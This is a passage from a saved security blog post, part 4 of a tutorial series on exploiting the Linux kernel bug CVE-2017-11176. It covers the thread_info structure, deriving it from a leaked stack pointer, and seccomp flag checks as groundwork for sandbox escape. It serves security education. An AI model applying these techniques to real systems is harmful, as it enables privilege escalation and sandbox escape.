<!DOCTYPE html>
<!-- saved from url=(0073)https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html -->
<html lang="en" class="fontawesome-i2svg-active fontawesome-i2svg-complete"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Lexfo's security blog - CVE-2017-11176: A step-by-step Linux Kernel exploitation (part 4/4)</title><meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport"><style type="text/css">svg:not(:root).svg-inline--fa{overflow:visible}.svg-inline--fa{display:inline-block;font-size:inherit;height:1em;overflow:visible;vertical-align:-.125em}.svg-inline--fa.fa-lg{vertical-align:-.225em}.svg-inline--fa.fa-w-1{width:.0625em}.svg-inline--fa.fa-w-2{width:.125em}.svg-inline--fa.fa-w-3{width:.1875em}.svg-inline--fa.fa-w-4{width:.25em}.svg-inline--fa.fa-w-5{width:.3125em}.svg-inline--fa.fa-w-6{width:.375em}.svg-inline--fa.fa-w-7{width:.4375em}.svg-inline--fa.fa-w-8{width:.5em}.svg-inline--fa.fa-w-9{width:.5625em}.svg-inline--fa.fa-w-10{width:.625em}.svg-inline--fa.fa-w-11{width:.6875em}.svg-inline--fa.fa-w-12{width:.75em}.svg-inline--fa.fa-w-13{width:.8125em}.svg-inline--fa.fa-w-14{width:.875em}.svg-inline--fa.fa-w-15{width:.9375em}.svg-inline--fa.fa-w-16{width:1em}.svg-inline--fa.fa-w-17{width:1.0625em}.svg-inline--fa.fa-w-18{width:1.125em}.svg-inline--fa.fa-w-19{width:1.1875em}.svg-inline--fa.fa-w-20{width:1.25em}.svg-inline--fa.fa-pull-left{margin-right:.3em;width:auto}.svg-inline--fa.fa-pull-right{margin-left:.3em;width:auto}.svg-inline--fa.fa-border{height:1.5em}.svg-inline--fa.fa-li{width:2em}.svg-inline--fa.fa-fw{width:1.25em}.fa-layers svg.svg-inline--fa{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.fa-layers{display:inline-block;height:1em;position:relative;text-align:center;vertical-align:-.125em;width:1em}.fa-layers svg.svg-inline--fa{-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter,.fa-layers-text{display:inline-block;position:absolute;text-align:center}.fa-layers-text{left:50%;top:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter{background-color:#ff253a;border-radius:1em;-webkit-box-sizing:border-box;box-sizing:border-box;color:#fff;height:1.5em;line-height:1;max-width:5em;min-width:1.5em;overflow:hidden;padding:.25em;right:0;text-overflow:ellipsis;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-bottom-right{bottom:0;right:0;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom right;transform-origin:bottom right}.fa-layers-bottom-left{bottom:0;left:0;right:auto;top:auto;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:bottom left;transform-origin:bottom left}.fa-layers-top-right{right:0;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-top-left{left:0;right:auto;top:0;-webkit-transform:scale(.25);transform:scale(.25);-webkit-transform-origin:top left;transform-origin:top left}.fa-lg{font-size:1.33333em;line-height:.75em;vertical-align:-.0667em}.fa-xs{font-size:.75em}.fa-sm{font-size:.875em}.fa-1x{font-size:1em}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-6x{font-size:6em}.fa-7x{font-size:7em}.fa-8x{font-size:8em}.fa-9x{font-size:9em}.fa-10x{font-size:10em}.fa-fw{text-align:center;width:1.25em}.fa-ul{list-style-type:none;margin-left:2.5em;padding-left:0}.fa-ul>li{position:relative}.fa-li{left:-2em;position:absolute;text-align:center;width:2em;line-height:inherit}.fa-border{border:solid .08em #eee;border-radius:.1em;padding:.2em .25em .15em}.fa-pull-left{float:left}.fa-pull-right{float:right}.fa.fa-pull-left,.fab.fa-pull-left,.fal.fa-pull-left,.far.fa-pull-left,.fas.fa-pull-left{margin-right:.3em}.fa.fa-pull-right,.fab.fa-pull-right,.fal.fa-pull-right,.far.fa-pull-right,.fas.fa-pull-right{margin-left:.3em}.fa-spin{-webkit-animation:fa-spin 2s infinite linear;animation:fa-spin 2s infinite linear}.fa-pulse{-webkit-animation:fa-spin 1s infinite steps(8);animation:fa-spin 1s infinite steps(8)}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.fa-rotate-90{-webkit-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-webkit-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-webkit-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-webkit-transform:scale(-1,1);transform:scale(-1,1)}.fa-flip-vertical{-webkit-transform:scale(1,-1);transform:scale(1,-1)}.fa-flip-horizontal.fa-flip-vertical{-webkit-transform:scale(-1,-1);transform:scale(-1,-1)}:root .fa-flip-horizontal,:root .fa-flip-vertical,:root .fa-rotate-180,:root .fa-rotate-270,:root .fa-rotate-90{-webkit-filter:none;filter:none}.fa-stack{display:inline-block;height:2em;position:relative;width:2em}.fa-stack-1x,.fa-stack-2x{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.svg-inline--fa.fa-stack-1x{height:1em;width:1em}.svg-inline--fa.fa-stack-2x{height:2em;width:2em}.fa-inverse{color:#fff}.sr-only{border:0;clip:rect(0,0,0,0);height:1px;margin:-1px;overflow:hidden;padding:0;position:absolute;width:1px}.sr-only-focusable:active,.sr-only-focusable:focus{clip:auto;height:auto;margin:0;overflow:visible;position:static;width:auto}</style><link href="https://blog.lexfo.fr/feeds/all.atom.xml" rel="alternate" title="Lexfo&#39;s security blog Full Atom Feed" type="application/atom+xml"><link href="https://blog.lexfo.fr/feeds/all.rss.xml" rel="alternate" title="Lexfo&#39;s security blog Full RSS Feed" type="application/rss+xml"><link href="https://blog.lexfo.fr/feeds/%7Bslug%7D.atom.xml" rel="alternate" title="Lexfo&#39;s security blog Categories Atom Feed" type="application/atom+xml"><link href="https://blog.lexfo.fr/feeds/%7Bslug%7D.rss.xml" rel="alternate" title="Lexfo&#39;s security blog Categories RSS Feed" type="application/rss+xml"><link href="https://blog.lexfo.fr/theme/images/favicon.ico" rel="icon" type="image/x-icon"><link href="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/packed.css" rel="stylesheet" type="text/css"></head><body><header class="blog-header py-3 text-center" id="logo"><h1><a href="https://blog.lexfo.fr/"><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/lexfo.png" title="Lexfo&#39;s security blog"></a></h1></header><nav class="navbar navbar-expand-md navbar-dark mb-4" style="background-color: rgb(179,32,39);"><div class="container"><button aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" class="navbar-toggler" data-target="#navbarSupportedContent" data-toggle="collapse" type="button"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarSupportedContent"><ul class="navbar-nav position-absolute-left"><li class="nav-item"><a class="nav-link text-light" href="https://lexfo.fr/">Back to the main site</a></li></ul><ul class="navbar-nav ml-auto mr-auto"><li class="nav-item"><a class="nav-link text-light" href="https://blog.lexfo.fr/">Home</a></li><li class="nav-item"><a class="nav-link text-light" href="https://blog.lexfo.fr/categories.html">Categories</a></li><li class="nav-item"><a class="nav-link text-light" href="https://blog.lexfo.fr/tags.html">Tags</a></li><li class="nav-item"><a class="nav-link text-light" href="https://blog.lexfo.fr/archives.html">Archives</a></li></ul></div></div></nav><main class="container" role="main"><div class="row"><article class="col-10 offset-1 blog-main"><div class="p-3 blog-post rounded"><h1 class="blog-post-title mb-1">CVE-2017-11176: A step-by-step Linux Kernel exploitation (part 4/4)</h1><div class="blog-post-meta mb-4"><p><span class="mr-3"><strong>Tue 02 October 2018</strong> by <strong>Nicolas FABRETTI</strong> in <strong><a href="https://blog.lexfo.fr/category/vulnerability.html">Vulnerability</a>.</strong></span></p><p><span><a "="" class="mr-2" href="https://blog.lexfo.fr/tag/linux.html"><svg class="svg-inline--fa fa-tag fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"></path></svg><!-- <span class="fas fa-tag"></span> --> Linux</a> <a "="" class="mr-2" href="https://blog.lexfo.fr/tag/exploit.html"><svg class="svg-inline--fa fa-tag fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"></path></svg><!-- <span class="fas fa-tag"></span> --> Exploit</a> <a "="" class="mr-2" href="https://blog.lexfo.fr/tag/vulnerability.html"><svg class="svg-inline--fa fa-tag fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"></path></svg><!-- <span class="fas fa-tag"></span> --> Vulnerability</a> <a "="" class="mr-2" href="https://blog.lexfo.fr/tag/kernel.html"><svg class="svg-inline--fa fa-tag fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"></path></svg><!-- <span class="fas fa-tag"></span> --> Kernel</a> <a "="" class="mr-2" href="https://blog.lexfo.fr/tag/step-by-step.html"><svg class="svg-inline--fa fa-tag fa-w-16" aria-hidden="true" data-prefix="fas" data-icon="tag" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M0 252.118V48C0 21.49 21.49 0 48 0h204.118a48 48 0 0 1 33.941 14.059l211.882 211.882c18.745 18.745 18.745 49.137 0 67.882L293.823 497.941c-18.745 18.745-49.137 18.745-67.882 0L14.059 286.059A48 48 0 0 1 0 252.118zM112 64c-26.51 0-48 21.49-48 48s21.49 48 48 48 48-21.49 48-48-21.49-48-48-48z"></path></svg><!-- <span class="fas fa-tag"></span> --> Step-by-step</a></span></p><div class="share" id="post-share-links"><div class="share-twitter"><a href="https://twitter.com/intent/tweet?text=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%204/4%29&amp;url=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-twitter fa-w-16" data-prefix="fab" data-icon="twitter" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg><!-- <i aria-hidden="true" class="fab fa-twitter"></i> -->Tweet</span></a></div><div class="share-facebook"><a href="http://www.facebook.com/sharer/sharer.php?u=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-facebook fa-w-14" data-prefix="fab" data-icon="facebook" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M448 56.7v398.5c0 13.7-11.1 24.7-24.7 24.7H309.1V306.5h58.2l8.7-67.6h-67v-43.2c0-19.6 5.4-32.9 33.5-32.9h35.8v-60.5c-6.2-.8-27.4-2.7-52.2-2.7-51.6 0-87 31.5-87 89.4v49.9h-58.4v67.6h58.4V480H24.7C11.1 480 0 468.9 0 455.3V56.7C0 43.1 11.1 32 24.7 32h398.5c13.7 0 24.8 11.1 24.8 24.7z"></path></svg><!-- <i aria-hidden="true" class="fab fa-facebook"></i> -->Share</span></a></div><div class="share-linkedin"><a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html&amp;title=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%204/4%29&amp;summary=In%20the%20last%20article%2C%20the%20arbitrary%20call%20primitive%20is%20used%20to%20gain%20arbitrary%20code%20execution%20in%20ring-0%20while%20bypassing%20SMEP.%20It%20covers%20an%20extensive%20study%20of%20page%20fault%20exception%20trace%2C%20how%20to%20find%20gadgets%20in%20kernel%20image%2C%20designing%20a%20ROP-chain%20to%20finally%20call%20the%20payload.%20In%20the%20end%2C%20it%20shows%20how%20to%20repair%20the%20kernel%20and%20gain%20root%20privileges.%20The%20core%20concept%20section%20focuses%20on%20the%20thread_info%20structure%2C%20virtual%20memory%20layout%20and%20netlink%27s%20hash%20tables.&amp;source=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-linkedin fa-w-14" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg><!-- <i aria-hidden="true" class="fab fa-linkedin"></i> -->Share</span></a></div><div class="share-email"><a href="mailto:?subject=CVE-2017-11176%3A%20A%20step-by-step%20Linux%20Kernel%20exploitation%20%28part%204/4%29&amp;body=https%3A//blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html" rel="nofollow noopener" target="_blank"><span><svg aria-hidden="true" class="svg-inline--fa fa-envelope fa-w-16" data-prefix="far" data-icon="envelope" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"></path></svg><!-- <i aria-hidden="true" class="far fa-envelope"></i> -->Share</span></a></div></div></div><div class="blog-post-content"><h1 id="introduction">Introduction</h1><p>In this final part, we will transform the arbitrary call primitive (cf. <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part3.html">part 3</a>) into arbitrary code execution in ring-0, repair the kernel and get the root credentials. It will emphasize a lot on x86-64 architecture-specific stuff.</p><p>First, the core concept section focuses on another critical kernel structure (<em>thread_info</em>) and how it can be abused from an exploitation point of view (retrieve <em>current</em>, escape seccomp-based sandbox, gain arbitrary read/write). Next, we will see the virtual memory layout, the kernel thread stacks and how they are linked to the <em>thread_info</em>. Then we will see how linux implements the hash tables used by Netlink. This will help for kernel repair.</p><p>Secondly, we will try to call a userland payload directly and see how we get blocked by a hardware protection mechanism (SMEP). We will do an extensive study of a <em>page fault exception</em> trace to get meaningful information and see various ways to defeat SMEP.</p><p>Thirdly, we will extract gadgets from a kernel image and explain why we need to restrict the research to the <em>.text</em> section. With such gadgets, we will do a stack pivot and see how to deal with aliasing. With relaxed constraints on gadget, we will implement the ROP-chain that disables SMEP, restore the stack pointer and stack frame as well as jumping to userland code in a clean state.</p><p>Fourth, we will do kernel reparation. While repairing the <em>socket</em> dangling pointer is pretty straightforward, repairing the netlink hash list is a bit more complex. Since the bucket lists are not circular and we lost track of some elements during the reallocation, we will use a trick and an information leak to repair them.</p><p>Finally, we will do a short study about the exploit reliability (where it can fail) and build a danger map during various stages of the exploit. Then, we will see how to gain root rights.</p><hr><h1 id="table-of-contents">Table of Contents</h1><ul><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html#core-concepts-4">Core Concepts #4</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html#meeting-supervisor-mode-execution-prevention">Meeting Supervisor Mode Execution Prevention</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html#defeating-smep-strategies">Defeating SMEP Strategies</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html#finding-gadgets">Finding Gadgets</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html#stack-pivoting">Stack Pivoting</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html#debugging-the-kernel-with-gdb">Debugging the kernel with GDB</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html#the-rop-chain">The ROP-Chain</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html#repair-the-kernel">Repair the Kernel</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html#reliability">Reliability</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html#getting-root">Getting root</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html#conclusion">Conclusion</a></li><li><a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html#going-further">Going Further</a></li></ul><hr><h1 id="core-concepts-4">Core Concepts #4</h1><p><strong>WARNING</strong>: A lot of concepts addressed here hold <strong>out-dated information</strong> due to a major overhaul started in the mid-2016's. For instance, some <em>thread_info</em>'s fields <a href="https://lore.kernel.org/patchwork/patch/698579/">have been moved</a> into the <em>thread_struct</em> (i.e. embedded in <em>task_struct</em>). Still, understanding "what it was" can help you understand "what it is" right now. And again, a lot of systems run "old" kernel versions (i.e. &lt; 4.8.x).</p><p>First, we have a look at the critical <em>thread_info</em> structure and how it can be abused during an exploitation scenario (retrieving <em>current</em>, escaping seccomp, arbitrary read/write).</p><p>Next, we will see how the <em>virtual memory map</em> is organized in a x86-64 environment. In particular, we will see why addressing translation is limited to 48-bits (instead of 64) as well as what a "canonical" address means.</p><p>Then, we will focus on the kernel thread stack. Explaining where and when they are created as well as what they hold.</p><p>Finally, we will focus on the netlink hash table data structure and the associated algorithm. Understanding them will help during kernel repair and improve the exploit reliability.</p><h2 id="the-thread_info-structure">The <em>thread_info</em> Structure</h2><p>Just like the <em>struct task_struct</em>, the <strong>struct thread_info</strong> structure is very important that one must understand in order to exploit bugs in the Linux kernel.</p><p>This structure is architecture dependent. In the x86-64 case, the definition is:</p><div class="highlight"><pre><span></span><code><span class="c1">// [arch/x86/include/asm/thread_info.h]</span>

<span class="k">struct</span> <span class="nc">thread_info</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">task_struct</span><span class="w">    </span><span class="o">*</span><span class="n">task</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">exec_domain</span><span class="w">    </span><span class="o">*</span><span class="n">exec_domain</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">__u32</span><span class="w">                 </span><span class="n">flags</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">__u32</span><span class="w">                 </span><span class="n">status</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">__u32</span><span class="w">                 </span><span class="n">cpu</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w">                   </span><span class="n">preempt_count</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">mm_segment_t</span><span class="w">          </span><span class="n">addr_limit</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="k">struct</span> <span class="nc">restart_block</span><span class="w">  </span><span class="n">restart_block</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="n">__user</span><span class="w">           </span><span class="o">*</span><span class="n">sysenter_return</span><span class="p">;</span><span class="w"></span>
<span class="cp">#ifdef CONFIG_X86_32</span>
<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="w">         </span><span class="n">previous_esp</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="n">__u8</span><span class="w">                  </span><span class="n">supervisor_stack</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span><span class="w"></span>
<span class="cp">#endif</span>
<span class="w">    </span><span class="kt">int</span><span class="w">                   </span><span class="n">uaccess_err</span><span class="p">;</span><span class="w"></span>
<span class="p">};</span><span class="w"></span>
</code></pre></div><p>The most important fields being:</p><ul><li><strong>task</strong>: pointer to the <em>task_struct</em> linked to this <em>thread_info</em> (cf. next section)</li><li><strong>flags</strong>: holds flags such as <em>_TIF_NEED_RESCHED</em> or <em>_TIF_SECCOMP</em> (cf. <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html#escaping-seccomp-based-sandbox">Escaping Seccomp-Based Sandbox</a>)</li><li><strong>addr_limit</strong>: the "highest" userland virtual address from kernel point-of-view. Used in "software protection mechanism" (cf. <a href="https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part4.html#gaining-arbitrary-readwrite">Gaining Arbitrary Read/Write</a>)</li></ul><p>Let's see how we can abuse each of those fields in an exploitation scenario.</p><h3 id="using-kernel-thread-stack-pointer">Using Kernel Thread Stack Pointer</h3><p>In general, if you've got access to a <em>task_struct</em> pointer, you can retrieve lots of other kernel structures by dereferencing pointers from it. For instance, we will use it in our case to find the address of the <em>file descriptor table</em> during kernel reparation.</p><p>Since the <em>task</em> field points to the associated <em>task_struct</em>, retrieving <em>current</em> (remember Core Concept #1?) is a simple as:</p><div class="highlight"><pre><span></span><code><span class="cp">#define get_current() (current_thread_info()-&gt;task)</span>
</code></pre></div><p>The problem is: how to get the address of the current <em>thread_info</em>?</p><p>Suppose that <strong>you have a pointer in the kernel "thread stack"</strong>, you can retrieve the current <em>thread_info</em> pointer with:</p><div class="highlight"><pre><span></span><code><span class="cp">#define THREAD_SIZE (PAGE_SIZE &lt;&lt; 2)</span>
<span class="cp">#define current_thread_info(ptr) (_ptr &amp; ~(THREAD_SIZE - 1))</span>

<span class="k">struct</span> <span class="nc">thread_info</span><span class="w"> </span><span class="o">*</span><span class="n">ti</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">current_thread_info</span><span class="p">(</span><span class="n">leaky_stack_ptr</span><span class="p">);</span><span class="w"></span>
</code></pre></div><p>The reason why this works is because the <em>thread_info</em> lives inside the kernel thread stack (see the "Kernel Stacks" section).</p><p>On the other hand, if you have a pointer to a <em>task_struct</em>, you can retrieve the current <em>thread_info</em> with the <strong>stack</strong> field in <em>task_struct</em>.</p><p>That is, if you have one of those pointers, you can retrieve each other structures:</p><p></p><figure><img src="./2018 - CVE-2017-11176 A step-by-step Linux Kernel exploitation part 4_files/task_thread_thread_info.png" title="task_struct and _thread_info_ relationship"><figcaption class="figcaption figure-caption text-center">task_thread_thread_info.png</figcaption></figure><p></p><p>Note that the <em>task_struct's stack</em> field doesn't point to the top of the (kernel thread) stack but to the <em>thread_info</em>!</p><h3 id="escaping-seccomp-based-sandbox">Escaping Seccomp-Based Sandbox</h3><p>Containers as well as sandboxed applications seem to be more and more widespread nowadays. Using a kernel exploit is sometimes the only way (or an easiest one) to actually escape them.</p><p>The Linux kernel's seccomp is a facility which allows programs to restrict access to syscalls. The syscall can be either fully forbidden (invoking it is impossible) or partially forbidden (parameters are filtered). It is setup using BPF rules (a "program" compiled in the kernel) called <strong>seccomp filters</strong>.</p><p>Once enabled, seccomp filters cannot be disabled by "normal" means. The API enforces it as there is no syscall for it.</p><p>When a program using seccomp makes a system call, the kernel checks if the <em>thread_info</em>'s flags has one of the <em>_TIF_WORK_SYSCALL_ENTRY</em> flags set (<em>TIF_SECCOMP</em> is one of them). If so, it follows the <strong>syscall_trace_enter()</strong> path. At the very beginning, the function <strong>secure_computing()</strong> is called:</p><div class="highlight"><pre><span></span><code><span class="kt">long</span><span class="w"> </span><span class="nf">syscall_trace_enter</span><span class="p">(</span><span class="k">struct</span> <span class="nc">pt_regs</span><span class="w"> </span><span class="o">*</span><span class="n">regs</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">long</span><span class="w"> </span><span class="n">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">test_thread_flag</span><span class="p">(</span><span class="n">TIF_SINGLESTEP</span><span class="p">))</span><span class="w"></span>
<span class="w">        </span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">flags</span><span class="w"> </span><span class="o">|=</span><span class="w"> </span><span class="n">X86_EFLAGS_TF</span><span class="p">;</span><span class="w"></span>

<span class="w">    </span><span class="cm">/* do the secure computing check first */</span><span class="w"></span>
<span class="w">    </span><span class="n">secure_computing</span><span class="p">(</span><span class="n">regs</span><span class="o">-&gt;</span><span class="n">orig_ax</span><span class="p">);</span><span class="w">            </span><span class="c1">// &lt;----- "rax" holds the syscall number</span>

<span class="w">  </span><span class="c1">// ...</span>
<span class="p">}</span><span class="w"></span>

<span class="k">static</span><span class="w"> </span><span class="kr">inline</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">secure_computing</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">this_syscall</span><span class="p">)</span><span class="w"></span>
<span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">test_thread_flag</span><span class="p">(</span><span class="n">TIF_SECCOMP</span><span class="p">)))</span><span class="w">      </span><span class="c1">// &lt;----- check the flag again</span>
<span class="w">        </span><span class="n">__secure_computing</span><span class="p">(</span><span class="n">this_syscall</span><span class="p">);</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
